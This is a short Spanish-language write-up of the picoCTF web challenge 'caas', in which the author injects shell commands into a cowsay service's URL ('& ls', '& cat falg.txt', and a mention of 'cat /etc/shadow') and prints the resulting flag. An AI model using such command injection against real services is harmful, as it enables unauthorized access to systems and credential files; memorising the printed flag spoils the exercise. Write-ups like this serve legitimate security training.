---
title: caas
date: 2025-05-23 12:00:00 +0200
categories: [writeup, picoctf]
tags: [picoctf, caas, explotación web]     
image:
    path: https://picoctf.org/img/logos/pico-mark.svg
    alt: PicoCTF
---

>caas
Author: BrownieInMotion
Description
Now presenting cowsay as a service
{: .prompt-tip }

Si abrimos el enlace de la web, nos aparecerá lo que parecen unas indicaciones para utilizar este servicio

``` html
Cowsay as a Service
Make a request to the following URL to cowsay your message:
https://caas.mars.picoctf.net/cowsay/{message}
```
Supongo que tenemos que explotar de alguna manera el hecho de que podemos insertar en __message__ algún comando. 
Que tal si pruebo algo como "holaquetal & cat /etc/shadow", comienzo con un simple ls y encuentrro 

```
https://caas.mars.picoctf.net/cowsay/hello%20&%20ls
```

Añadiendo el ls podemos ver un archivo interesante falg.txt
```
Dockerfile
falg.txt
index.js
node_modules
package.json
public
yarn.lock
 _______
< hello >
 -------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||

```

https://caas.mars.picoctf.net/cowsay/hello%20&%20cat%20falg.txt

```
picoCTF{moooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0o}
 _______
< hello >
 -------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
```

flag: **picoCTF{moooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0o}**

